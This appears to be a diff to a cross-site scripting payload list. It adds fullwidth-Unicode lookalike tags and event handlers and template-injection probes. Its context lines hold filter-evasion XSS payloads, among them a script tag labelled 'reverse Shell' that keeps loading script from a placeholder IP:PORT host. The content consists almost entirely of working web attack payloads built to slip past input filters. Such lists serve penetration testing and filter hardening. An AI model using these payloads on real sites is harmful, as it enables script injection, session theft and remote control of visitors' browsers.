@@ -12,6 +12,10 @@
 
 <script>setInterval(function(){d=document;z=d.createElement("script");z.src="//IP:PORT";d.body.appendChild(z)},0)</script>  ==> reverse Shell
 
+＜img src⁼p onerror⁼＇prompt⁽1⁾＇﹥
+＜script src=a／＞
+＂onclick=＇prompt(1)＇
+
 
 "><block%quote oncontextmenu%3Dconfirm(1)>Right click me</blockquote><!--
 <--` <body/onload=&lt;!--&gt;&#10alert(1)> --!>
@@ -35,6 +39,8 @@ javascript:alert(1)
 "; ||confirm('XSS') || "
 '*prompt(1)*'
 {{32*32}}
+﹛﹛3+3﹜﹜
+［［5+5］］
 
 x");$=alert, $(1);//
 ""});});});alert(1);$('a').each(function(i){$(this).click(function(event){x({y
